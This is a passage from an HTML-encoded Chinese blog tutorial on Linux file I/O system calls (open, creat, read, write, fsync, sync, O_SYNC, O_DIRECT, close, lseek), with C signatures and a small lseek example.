50;&#x8FDB;&#x7A0B;&#xFF0C;&#x9ED8;&#x8BA4;&#x4F1A;&#x4ECE;&#x7236;&#x8FDB;&#x7A0B;&#x83B7;&#x5F97;&#x4E00;&#x4EFD;&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x8868;&#x7684;&#x62F7;&#x8D1D;&#xFF1B;&#x5B50;&#x8FDB;&#x7A0B;&#x4E2D;&#x6587;&#x4EF6;&#x7684;&#x53D8;&#x5316;&#x4E0D;&#x4F1A;&#x5F71;&#x54CD;&#x7236;&#x8FDB;&#x7A0B;(&#x62F7;&#x8D1D;&#x7684;&#x76EE;&#x7684;? &#x4E3A;&#x4E86;&#x6548;&#x7387;?)</li></ol><h3 id="&#x6253;&#x5F00;&#x6587;&#x4EF6;"><a href="#&#x6253;&#x5F00;&#x6587;&#x4EF6;" class="headerlink" title="&#x6253;&#x5F00;&#x6587;&#x4EF6;"></a>&#x6253;&#x5F00;&#x6587;&#x4EF6;</h3><p>&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x5305;&#x62EC;&#x6253;&#x5F00;&#x5DF2;&#x6709;&#x6587;&#x4EF6;&#x4EE5;&#x53CA;&#x6253;&#x5F00;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x6587;&#x4EF6;&#xFF08;&#x5373;&#x521B;&#x5EFA;&#x6587;&#x4EF6;&#xFF09;&#x3002;&#x8FD4;&#x56DE;&#x503C;&#x662F;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#xFF0C;&#x5931;&#x8D25;&#x7684;&#x8BDD;&#x8FD4;&#x56DE;-1.<br>&#x6BD4;&#x8F83;&#x91CD;&#x8981;&#x7684;2&#x70B9;&#xFF1A;</p><ol><li>&#x82E5;&#x65B0;&#x5EFA;&#x6587;&#x4EF6;&#xFF0C;&#x90A3;&#x4E48;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x6240;&#x5C5E;&#x542F;&#x52A8;&#x8BE5;&#x8FDB;&#x7A0B;&#x7684;&#x7528;&#x6237;&#xFF1B;&#x7528;&#x6237;&#x7EC4;&#x7684;&#x8BDD;&#x5B58;&#x5728;&#x4E24;&#x4E2A;&#x6807;&#x51C6;&#xFF0C;&#x8BE6;&#x7EC6;&#x53EF;&#x67E5;&#x770B;&#x76F8;&#x5173;&#x8D44;&#x6599;&#x3002;</li><li>&#x65B0;&#x5EFA;&#x6587;&#x4EF6;&#xFF0C;&#x6D89;&#x53CA;&#x5230;&#x6743;&#x9650;&#x95EE;&#x9898;&#xFF0C;&#x5728;&#x6253;&#x5F00;&#x7684;&#x63A5;&#x53E3;&#x4E2D;&#x8BBE;&#x7F6E;&#x3002;<br>&#x4E24;&#x4E2A;&#x63A5;&#x53E3;&#x51FD;&#x6570;&#xFF0C;open&#x3001;creat(&#x6CE8;&#x610F;&#x6CA1;&#x6709;e zZ&#x2026;)<br><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">open</span> <span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name, <span class="hljs-keyword">int</span> flags)</span></span>;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">open</span> <span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name, <span class="hljs-keyword">int</span> flags, <span class="hljs-keyword">mode_t</span> mode)</span></span>;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">creat</span> <span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name, <span class="hljs-keyword">mode_t</span> mode)</span></span>;</span><br></pre></td></tr></tbody></table></figure><br>&#x76F8;&#x5173;&#x53EF;&#x4EE5;&#x67E5;&#x770B;&#x624B;&#x518C;&#x8BF4;&#x660E;&#xFF0C;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;creat&#x521B;&#x5EFA;&#x65B0;&#x7684;&#x6587;&#x4EF6;&#x548C;open&#x521B;&#x5EFA;&#x6CA1;&#x6709;&#x533A;&#x522B;&#xFF1B;mode&#x8868;&#x793A;&#x7684;&#x8BBE;&#x7F6E;&#x65B0;&#x5EFA;&#x6587;&#x4EF6;&#x6743;&#x9650;&#xFF0C;&#x53EA;&#x6709;&#x5728;&#x65B0;&#x5EFA;&#x6587;&#x4EF6;&#x65F6;&#x624D;&#x751F;&#x6548;&#x3002;</li></ol><h3 id="&#x8BFB;&#x6587;&#x4EF6;"><a href="#&#x8BFB;&#x6587;&#x4EF6;" class="headerlink" title="&#x8BFB;&#x6587;&#x4EF6;"></a>&#x8BFB;&#x6587;&#x4EF6;</h3><p>&#x8BFB;&#x6587;&#x4EF6;&#x662F;&#x5E38;&#x89C1;&#x7684;&#x63A5;&#x53E3;&#xFF0C;read<br></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> <span class="hljs-title">read</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">size_t</span> len)</span></span>;</span><br></pre></td></tr></tbody></table></figure><br>&#x5176;&#x4E2D;fd&#x5C31;&#x662F;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x4E86;&#xFF0C;&#x8981;&#x8BFB;&#x54EA;&#x4E2A;&#x6587;&#x4EF6;&#x5C31;&#x4F20;&#x5165;&#x8BE5;&#x6587;&#x4EF6;&#x7684;&#x63CF;&#x8FF0;&#x7B26;&#x5373;&#x53EF;&#x4E86;&#x3002;&#x6211;&#x4EEC;&#x6BD4;&#x8F83;&#x5E38;&#x7528;&#x7684;&#x662F;0&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x4ECE;shell&#x547D;&#x4EE4;&#x884C;&#x4E2D;&#x8F93;&#x5165;&#x4E86;&#xFF0C;&#x5BF9;&#x5E94;&#x4E8E;&#x524D;&#x9762;&#x7684;&#x4ECB;&#x7ECD;&#xFF0C;0&#x5C31;&#x662F;&#x6807;&#x51C6;&#x8F93;&#x5165;&#x3002;len&#x4E3A;&#x6700;&#x5927;&#x957F;&#x5EA6;&#xFF0C;&#x8BD5;&#x4E86;&#x4E00;&#x4E0B;&#x82E5;len&#x4E3A;0&#x6216;&#x8005;&#x8D1F;&#x6570;&#x7684;&#x8BDD;&#x5C31;&#x76F4;&#x63A5;&#x7ED3;&#x675F;&#x4E86;&#xFF0C;&#x4E0D;&#x4F1A;&#x963B;&#x585E;&#x7B49;&#x5F85;&#x8F93;&#x5165;&#x3002;<br>&#x5173;&#x4E8E;&#x963B;&#x585E;&#x548C;&#x975E;&#x963B;&#x585E;&#xFF0C;&#x6211;&#x4EEC;&#x6BD4;&#x8F83;&#x5E38;&#x89C1;&#x7684;&#x662F;&#x963B;&#x585E;&#x4E86;&#xFF0C;&#x4E5F;&#x662F;&#x9ED8;&#x8BA4;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x5C31;&#x662F;&#x4E00;&#x76F4;&#x6302;&#x8D77;&#x76F4;&#x5230;read&#x7ED3;&#x675F;&#x6216;&#x8005;&#x9519;&#x8BEF;&#x4EA7;&#x751F;&#xFF1B;&#x975E;&#x963B;&#x585E;&#x5C31;&#x76F8;&#x53CD;&#x4E86;&#x3002;<br>&#x4E00;&#x822C;&#x5224;&#x65AD;read&#x7684;&#x72B6;&#x6001;&#x5C31;&#x901A;&#x8FC7;&#x8FD4;&#x56DE;&#x503C;&#x4E86;&#xFF0C;&#x4E66;&#x4E0A;&#x5BF9;&#x53EF;&#x80FD;&#x7684;&#x7ED3;&#x679C;&#x63CF;&#x8FF0;&#x7684;&#x5F88;&#x8BE6;&#x7EC6;&#xFF1B;&#x603B;&#x7ED3;&#x51E0;&#x70B9;&#x5C31;&#x662F;&#xFF1A;<p></p><ol><li>&#x5E38;&#x89C1;&#x7684;&#x8BDD;&#xFF0C;&#x5C31;&#x8FD4;&#x56DE;&#x5B9E;&#x9645;&#x8BFB;&#x5165;&#x7684;&#x957F;&#x5EA6;</li><li>&#x9519;&#x8BEF;&#x8FD4;&#x56DE;-1&#xFF0C;&#x5177;&#x4F53;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#x9700;&#x8981;&#x8FDB;&#x4E00;&#x6B65;&#x5224;&#x65AD;</li><li>&#x8FD4;&#x56DE;0&#xFF0C;&#x6807;&#x5FD7;&#x7740;EOF&#xFF0C;&#x6CA1;&#x6709;&#x53EF;&#x8BFB;&#x7684;&#x6570;&#x636E;&#x4E86;<br><img src="/images/LSP/1.PNG" alt="read&#x8FD4;&#x56DE;&#x503C;"></li></ol><h3 id="&#x5199;&#x6587;&#x4EF6;"><a href="#&#x5199;&#x6587;&#x4EF6;" class="headerlink" title="&#x5199;&#x6587;&#x4EF6;"></a>&#x5199;&#x6587;&#x4EF6;</h3><p>&#x5199;&#x6587;&#x4EF6;&#x5E38;&#x7528;&#x7684;&#x5C31;&#x662F;write&#x4E86;<br></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> <span class="hljs-title">write</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">size_t</span> count)</span></span>;</span><br></pre></td></tr></tbody></table></figure><br>&#x548C;read&#x7C7B;&#x4F3C;&#x4E86;&#xFF0C;&#x53EA;&#x662F;&#x6211;&#x4EEC;&#x5E38;&#x7528;&#x7684;fd&#x4E3A;1&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6807;&#x51C6;&#x8F93;&#x51FA;&#x4E86;&#x3002;<br>write&#x5199;&#x5165;&#x6587;&#x4EF6;&#x7684;&#x8BDD;&#xFF0C;&#x6700;&#x7EC8;&#x662F;&#x5199;&#x5165;&#x78C1;&#x76D8;&#xFF1B;&#x503C;&#x5F97;&#x4E00;&#x63D0;&#x7684;&#x662F;&#xFF0C;&#x4E3A;&#x4E86;&#x63D0;&#x9AD8;&#x5904;&#x7406;&#x6548;&#x7387;&#xFF0C;&#x5185;&#x6838;&#x4F1A;&#x5C06;&#x9700;&#x8981;&#x5199;&#x5165;&#x7684;&#x6570;&#x636E;&#x590D;&#x5236;&#x5230;&#x5185;&#x6838;&#x7F13;&#x51B2;&#x533A;&#x4E2D;&#xFF0C;&#x7136;&#x540E;&#x7B49;&#x5230;&#x7A7A;&#x95F2;&#x6216;&#x8005;&#x5176;&#x4ED6;&#x6761;&#x4EF6;&#x6EE1;&#x8DB3;&#x65F6;&#xFF0C;&#x5C06;&#x591A;&#x4E2A;&#x7F13;&#x51B2;&#x533A;&#x7684;&#x6570;&#x636E;&#x4E00;&#x5E76;&#x5199;&#x5165;&#x78C1;&#x76D8;&#x4E2D;&#x3002;&#x4E5F;&#x79F0;&#x4E3A;&#x5EF6;&#x8FDF;&#x5199;&#x5165;&#x3002;&#x8FD9;&#x6837;&#x65E2;&#x4FDD;&#x8BC1;&#x4E86;&#x7A0B;&#x5E8F;&#x6267;&#x884C;&#x7684;&#x6548;&#x7387;&#xFF0C;&#x5373;&#x8C03;&#x7528;write&#x5C31;&#x80FD;&#x591F;&#x5FEB;&#x901F;&#x6267;&#x884C;&#x7ED3;&#x675F;&#xFF1B;&#x540C;&#x65F6;&#x4E0B;&#x4E00;&#x6B21;&#x8C03;&#x7528;read&#x8BFB;&#x53D6;&#x5199;&#x5165;&#x7684;&#x6570;&#x636E;&#x65F6;&#x53EF;&#x4EE5;&#x4E0D;&#x7528;&#x4ECE;&#x78C1;&#x76D8;&#x4E2D;&#x8BFB;&#x53D6;&#xFF0C;&#x800C;&#x662F;&#x76F4;&#x63A5;&#x4ECE;&#x7F13;&#x51B2;&#x533A;&#x8BFB;&#x5165;&#x3002;&#x5F53;&#x7136;&#x4E5F;&#x5B58;&#x5728;&#x98CE;&#x9669;&#xFF0C;&#x5728;&#x5199;&#x5165;&#x78C1;&#x76D8;&#x524D;&#x7CFB;&#x7EDF;&#x5D29;&#x4E86;&#xFF0C;&#x6570;&#x636E;&#x5C31;&#x4E22;&#x5931;&#x4E86;&#x3002;<p></p><h3 id="I-O-&#x540C;&#x6B65;"><a href="#I-O-&#x540C;&#x6B65;" class="headerlink" title="I/O &#x540C;&#x6B65;"></a>I/O &#x540C;&#x6B65;</h3><p>&#x4E3B;&#x8981;&#x662F;&#x5BF9;&#x9488;&#x5BF9;&#x524D;&#x9762;&#x7684;write&#x64CD;&#x4F5C;&#xFF0C;&#x56E0;&#x4E3A;write&#x9ED8;&#x8BA4;&#x662F;&#x5C06;&#x6570;&#x636E;&#x653E;&#x5728;&#x5185;&#x6838;&#x7F13;&#x51B2;&#x533A;&#x4E2D;&#xFF0C;&#x5E76;&#x4E0D;&#x5199;&#x5165;&#x78C1;&#x76D8;&#x4E4B;&#x4E2D;&#x3002;&#x5F53;&#x7136;&#x6709;&#x4E9B;&#x9700;&#x6C42;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x6570;&#x636E;&#x5B9E;&#x65F6;&#x540C;&#x6B65;&#x5230;&#x78C1;&#x76D8;&#x4E2D;&#xFF0C;&#x5C24;&#x5176;&#x662F;&#x4E00;&#x4E9B;&#x5F88;&#x91CD;&#x8981;&#x7684;&#x6570;&#x636E;&#xFF1B;&#x8FD9;&#x91CC;&#x7684;&#x8BDD;Linux&#x4E5F;&#x63D0;&#x4F9B;&#x4E86;&#x76F8;&#x5E94;&#x7684;&#x64CD;&#x4F5C;&#x9009;&#x9879;&#x3002;</p><ol><li>&#x9488;&#x5BF9;&#x5355;&#x4E2A;&#x6587;&#x4EF6;&#x540C;&#x6B65;&#x63A5;&#x53E3;<br><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fsync</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> fd)</span></span>;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fdatasync</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> fd)</span></span>;</span><br></pre></td></tr></tbody></table></figure><br>&#x8FD9;&#x4E24;&#x4E2A;&#x63A5;&#x53E3;&#x51FD;&#x6570;&#x7528;&#x4E8E;&#x5BF9;&#x6307;&#x5B9A;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x4E00;&#x6B21;&#x540C;&#x6B65;&#xFF0C;&#x5373;&#x5C06;fd&#x5BF9;&#x5E94;&#x7684;&#x7F13;&#x51B2;&#x533A;&#x6570;&#x636E;&#x5199;&#x5165;&#x78C1;&#x76D8;&#x4E4B;&#x4E2D;&#x3002;&#x533A;&#x522B;&#x5728;&#x4E8E;fsync&#x5C06;&#x6240;&#x6709;&#x6570;&#x636E;&#x5199;&#x5165;&#xFF0C;fdatasync&#x4EC5;&#x5199;&#x5165;&#x666E;&#x901A;&#x6570;&#x636E;&#xFF0C;&#x5E76;&#x4E0D;&#x5305;&#x62EC;&#x5143;&#x6570;&#x636E;(&#x4EFB;&#x4F55;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x5305;&#x62EC;&#x4E24;&#x90E8;&#x5206;&#xFF0C;&#x4E00;&#x662F;&#x666E;&#x901A;&#x6570;&#x636E;&#xFF0C;&#x4E00;&#x662F;&#x5143;&#x6570;&#x636E;&#xFF0C;&#x7B80;&#x5355;&#x63CF;&#x8FF0;&#x4E3A;&#x666E;&#x901A;&#x6570;&#x636E;&#x5C31;&#x662F;&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x5B9E;&#x9645;&#x6570;&#x636E;&#xFF0C;&#x5143;&#x6570;&#x636E;&#x5C31;&#x662F;&#x63CF;&#x8FF0;&#x6587;&#x4EF6;&#x7279;&#x5F81;&#x7684;&#x7CFB;&#x7EDF;&#x6570;&#x636E;&#x3002;&#x8BE6;&#x7EC6;&#x53C2;&#x8003;<a href="http://www.cnblogs.com/wspblog/p/4967339.html)&#x3002;" target="_blank" rel="noopener">http://www.cnblogs.com/wspblog/p/4967339.html)&#x3002;</a><br>&#x8C03;&#x7528;&#x6210;&#x529F;&#x8FD4;&#x56DE;0&#xFF0C;&#x5931;&#x8D25;&#x8FD4;&#x56DE;-1.<br>&#x4E0A;&#x9762;&#x662F;&#x5BF9;&#x5355;&#x4E2A;&#x6587;&#x4EF6;&#x7684;&#xFF0C;&#x5F53;&#x7136;&#x4E5F;&#x6709;&#x5BF9;&#x5168;&#x90E8;&#x6587;&#x4EF6;&#x7684;&#xFF0C;&#x5373;&#x5C06;&#x6240;&#x6709;&#x7F13;&#x51B2;&#x533A;(&#x6682;&#x5B58;&#x6587;&#x4EF6;&#x6570;&#x636E;&#x7684;)&#x4E2D;&#x6570;&#x636E;&#x540C;&#x6B65;&#x5230;&#x78C1;&#x76D8;</li><li>&#x9488;&#x5BF9;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x540C;&#x6B65;&#x63A5;&#x53E3;<br><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sync</span> <span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;</span><br></pre></td></tr></tbody></table></figure><br>&#x5F53;&#x7136;&#x9664;&#x4E86;&#x63A5;&#x53E3;&#x4E4B;&#x5916;&#xFF0C;&#x5728;&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x65F6;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8BBE;&#x7F6E;&#x53C2;&#x6570;&#x6765;&#x5B9E;&#x73B0;&#x540C;&#x6B65;</li><li>&#x901A;&#x8FC7;&#x8BBE;&#x7F6E;&#x53C2;&#x6570;<br><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">//O_SYNC </span></span><br><span class="line">fd = <span class="hljs-built_in">open</span> (file, O_WRONLY | O_SYNC);</span><br></pre></td></tr></tbody></table></figure><br>O_SYNC&#x6807;&#x5FD7;&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x4F7F;&#x5F97;&#x6240;&#x6709;&#x5728;&#x8BE5;&#x6587;&#x4EF6;&#x4E0A;&#x7684;I/O&#x64CD;&#x4F5C;&#x90FD;&#x4F1A;&#x540C;&#x6B65;&#x5230;&#x78C1;&#x76D8;<br>O_DSYNC &#x548C; O_RSYNC&#x6807;&#x5FD7;&#xFF0C;O_DSYNC&#x6807;&#x5FD7;&#x4F7F;&#x7528;&#x666E;&#x901A;&#x6570;&#x636E;&#x4F1A;&#x540C;&#x6B65;&#xFF0C;&#x5143;&#x6570;&#x636E;&#x4E0D;&#x540C;&#x6B65;&#xFF1B;O_RSYNC&#x6807;&#x5FD7;&#x8981;&#x6C42;&#x8BFB;&#x64CD;&#x4F5C;&#x50CF;&#x5199;&#x64CD;&#x4F5C;&#x4E00;&#x6837;&#x540C;&#x6B65;(&#x5F53;&#x7136;&#x4E3B;&#x8981;&#x662F;&#x5143;&#x6570;&#x636E;&#xFF0C;&#x6BD4;&#x5982;&#x6700;&#x540E;&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x7684;&#x65F6;&#x95F4;&#x66F4;&#x65B0;&#x4E4B;&#x7C7B;&#x7684;&#xFF0C;&#x56E0;&#x4E3A;&#x8BFB;&#x6587;&#x4EF6;&#x5E76;&#x4E0D;&#x4F1A;&#x4FEE;&#x6539;&#x57FA;&#x672C;&#x6570;&#x636E;&#x2026;&#x2026;)&#x3002;</li></ol><h3 id="&#x76F4;&#x63A5;I-O"><a href="#&#x76F4;&#x63A5;I-O" class="headerlink" title="&#x76F4;&#x63A5;I/O"></a>&#x76F4;&#x63A5;I/O</h3><p>&#x6709;&#x65F6;&#x5019;&#x7528;&#x6237;&#x5E76;&#x4E0D;&#x9700;&#x8981;&#x5185;&#x6838;&#x7684;I/O&#x7BA1;&#x7406;&#xFF0C;&#x800C;&#x662F;&#x503E;&#x5411;&#x4E8E;&#x5B9E;&#x73B0;&#x4E00;&#x5957;&#x5C5E;&#x4E8E;&#x81EA;&#x5DF1;&#x7684;I/O&#x7BA1;&#x7406;&#x3002;<br>&#x5728;open&#x4E2D;&#x4F7F;&#x7528;O_DIRECT&#x6807;&#x5FD7;&#x4F1A;&#x4F7F;&#x5185;&#x6838;&#x6700;&#x5C0F;&#x5316;I/O&#x7BA1;&#x7406;&#x7684;&#x5F71;&#x54CD;&#x3002;&#x4F7F;&#x7528;&#x8BE5;&#x6807;&#x5FD7;&#xFF0C;I/O&#x64CD;&#x4F5C;&#x5C06;&#x4F1A;&#x5FFD;&#x7565;&#x9875;&#x7F13;&#x5B58;&#x673A;&#x5236;&#xFF0C;&#x76F4;&#x63A5;&#x5BF9;&#x7528;&#x6237;&#x7A7A;&#x95F4;&#x7F13;&#x51B2;&#x533A;&#x548C;&#x8BBE;&#x5907;&#x8FDB;&#x884C;&#x521D;&#x59CB;&#x5316;&#x3002;&#x6240;&#x6709;I/O&#x5C06;&#x662F;&#x540C;&#x6B65;&#x7684;&#xFF0C;&#x64CD;&#x4F5C;&#x5728;&#x5B8C;&#x6210;&#x4E4B;&#x524D;&#x4E0D;&#x4F1A;&#x8FD4;&#x56DE;&#x3002;</p><h3 id="&#x5173;&#x95ED;&#x6587;&#x4EF6;"><a href="#&#x5173;&#x95ED;&#x6587;&#x4EF6;" class="headerlink" title="&#x5173;&#x95ED;&#x6587;&#x4EF6;"></a>&#x5173;&#x95ED;&#x6587;&#x4EF6;</h3><p>&#x5E38;&#x7528;&#x7684;close&#x63A5;&#x53E3;<br></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">close</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> fd)</span></span>;</span><br></pre></td></tr></tbody></table></figure><br>&#x6267;&#x884C;&#x6210;&#x529F;&#x8FD4;&#x56DE;0&#xFF0C;&#x5931;&#x8D25;&#x8FD4;&#x56DE;-1<p></p><h3 id="lseek&#x67E5;&#x627E;"><a href="#lseek&#x67E5;&#x627E;" class="headerlink" title="lseek&#x67E5;&#x627E;"></a>lseek&#x67E5;&#x627E;</h3><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">off_t</span> <span class="hljs-title">lseek</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">off_t</span> pos, <span class="hljs-keyword">int</span> origin)</span></span>;</span><br></pre></td></tr></tbody></table></figure><br>&#x76F8;&#x5173;&#x53C2;&#x6570;&#x5B9A;&#x4E49;&#x53C2;&#x8003;&#xFF1A;<a href="http://www.cnblogs.com/ly01/p/4597926.html" target="_blank" rel="noopener">http://www.cnblogs.com/ly01/p/4597926.html</a><br>&#x8BE5;&#x63A5;&#x53E3;&#x4E3B;&#x8981;&#x662F;&#x4E3A;&#x4E86;&#x6EE1;&#x8DB3;&#x5728;&#x6307;&#x5B9A;&#x4F4D;&#x7F6E;&#x8BFB;&#x5199;&#x7684;&#x9700;&#x6C42;&#x3002;&#x8FD9;&#x4E48;&#x8BF4;&#x5427;&#xFF0C;&#x5047;&#x8BBE;&#x6211;&#x4EEC;&#x8C03;&#x7528;read&#x51FD;&#x6570;&#x8FDB;&#x884C;&#x8BFB;&#x53D6;&#x6570;&#x636E;&#xFF0C;read (int fd, void *buf, size_t len); &#x5176;&#x4E2D;&#x4F20;&#x5165;&#x7684;&#x662F;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x6807;&#x8BC6;&#x7B26;fd&#xFF0C;&#x7528;&#x4E8E;&#x627E;&#x5230;&#x6587;&#x4EF6;&#xFF1B;&#x5176;&#x5B9E;&#x8FD9;&#x4E2D;&#x95F4;&#x8FD8;&#x9690;&#x85CF;&#x4E86;&#x53E6;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x90A3;&#x5C31;&#x662F;&#x6587;&#x4EF6;&#x504F;&#x79FB;&#xFF0C;&#x9ED8;&#x8BA4;&#x6211;&#x4EEC;&#x7684;&#x64CD;&#x4F5C;&#x504F;&#x79FB;&#x90FD;&#x662F;0&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x7136;&#x540E;&#x8BFB;&#x53D6;&#x5C31;&#x4F1A;&#x4ECE;&#x6587;&#x4EF6;&#x7684;&#x5F00;&#x59CB;&#x4E4B;&#x5904;&#x8BFB;&#xFF0C;&#x800C;lseek&#x5C31;&#x662F;&#x4E3A;&#x4E86;&#x6539;&#x53D8;&#x8FD9;&#x4E2A;&#x504F;&#x79FB;&#x503C;&#xFF0C;&#x4F7F;&#x5F97;&#x4ECE;&#x6307;&#x5B9A;&#x7684;&#x4F4D;&#x7F6E;&#x5F00;&#x59CB;&#x8BFB;&#x5165;&#x3002;<br>&#x5199;&#x4E86;&#x4E00;&#x4E2A;&#x5C0F;&#x4F8B;&#x5B50;&#xFF0C;&#x5176;&#x4E2D;1234.txt&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#x4E3A;1234567890<br><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">        <span class="hljs-keyword">char</span> buf[<span class="hljs-number">100</span>] ;</span><br><span class="line">        <span class="hljs-keyword">int</span> fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;1234.txt&quot;</span>, O_RDWR) ;</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">off_t</span> t = lseek(fd, <span class="hljs-number">5</span>, SEEK_CUR) ;</span><br><span class="line">        <span class="hljs-built_in">read</span>(fd, buf, <span class="hljs-number">1</span>) ;</span><br><span class="line"></span><br><span class="line">        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, buf) ;</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> 